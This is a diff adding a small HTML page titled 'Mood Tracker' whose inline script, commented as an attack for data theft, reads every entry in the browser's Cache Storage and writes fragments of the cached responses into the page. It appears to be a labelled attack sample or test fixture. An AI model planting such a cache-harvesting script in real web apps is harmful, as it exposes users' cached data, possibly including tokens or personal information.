@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Tracker</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Cache API access for data theft
+    caches.keys().then(function(cacheNames) {
+      cacheNames.forEach(function(cacheName) {
+        caches.open(cacheName).then(function(cache) {
+          cache.keys().then(function(requests) {
+            requests.forEach(function(request) {
+              cache.match(request).then(function(response) {
+                response.text().then(function(data) {
+                  document.getElementById('root').textContent += data.substring(0, 100);
+                });
+              });
+            });
+          });
+        });
+      });
+    });
+  </script>
+</body>
+</html>
